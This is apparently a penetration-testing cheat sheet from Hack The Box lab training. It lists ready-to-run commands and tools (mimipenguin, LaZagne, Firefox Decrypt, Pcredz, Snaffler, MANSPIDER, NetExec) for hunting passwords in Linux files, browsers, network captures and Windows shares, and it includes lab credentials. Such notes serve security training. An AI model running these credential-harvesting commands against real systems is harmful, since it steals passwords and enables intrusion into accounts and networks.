## Credential hunting linux
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

```
sudo python3 mimipenguin.py
```

```
sudo python2.7 laZagne.py all
sudo python3 laZagne.py browsers
```

The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.
```
python3.9 firefox_decrypt.py
```

## credential hunting in Network Traffic
```bash
./Pcredz -f demo.pcapng -t -v
```

```powershell
Get-ChildItem -Recurse -Include *.ext \\$target\Share | Select-String -Pattern "password"
```

```
c:\Users\Public>Snaffler.exe -s
```
- `-u` retrieves a list of users from Active Directory and searches for references to them in files
- `-i` and `-n` allow you to specify which shares should be included in the search

```powershell
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

```bash
MarcosV999@htb[/htb]$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider $target -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

```bash
MarcosV999@htb[/htb]$ nxc smb $target -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```
